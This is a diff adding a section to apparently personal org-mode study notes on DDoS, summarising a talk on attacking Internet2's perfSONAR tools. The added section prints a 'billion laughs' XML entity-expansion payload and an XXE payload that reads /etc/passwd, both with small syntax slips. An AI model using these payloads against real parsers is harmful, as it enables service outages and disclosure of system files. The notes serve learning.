@@ -1,7 +1,7 @@
-#+TAGS: sec
+#+TAGS: sec ddos
 
 
-* DDoS
+* DDoS								   :sec:ddos:
 * Cmds
 * Overview
 * Types of DDoS
@@ -54,6 +54,50 @@ this amplification is 50x
 - Good networks don't let packets originate from IPs they don't own (BCP38)
 - lots of bad networks that allow spoofed ips
   
+** [[https://www.youtube.com/watch?v%3DFi-nI-Faj4I][Attacking Network Infrastructure to Generate a 4Tbs DDos]]
+- What is Internet2
+  - 282 Higher Education Institutes
+  - 86 Corporations
+  - 66 Affiliate members (Gov)
+  - 42 Regional and State Education Networks
+    
+- Internet2 Products
+  - Trust Identity & Middleware
+    - InCommon Federation
+    - Shibboleth
+  - Performance & Analytics    
+    - BWCTL - Bandwidth Test Controller
+    - NDT - Network Diagnostic Tool
+    - OWAMP - One Way Ping
+    - perfSONAR - pS-Performance Toolkit
+      - wrapper for all of the tools
+      
+- Attacking PerfSONAR
+  - xml lolz attack
+    - using the xml entity property create a huge referenced string that has to be parsed by python/perl/etc
+#+BEGIN_SRC sh
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+    <!ENTITY lol "lol">
+    <!ELEMENT lolz (#PCDATA)>
+    <!ELEMENT lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+    <!ELEMENT lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+    <!ELEMENT lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>
+#+END_SRC    
+continue this to create a massive string
+
+  - system Entity - this allowes for a system file to be loaded into an entity
+#+BEGIN_SRC sh
+<?xml version ="1.0"?>
+<!DOCTYPE foo [
+    <!ELEMENT foo ANY>
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo&xxe;</foo>
+#+END_SRC
+
 * Tutorial
 * Books
 * Links
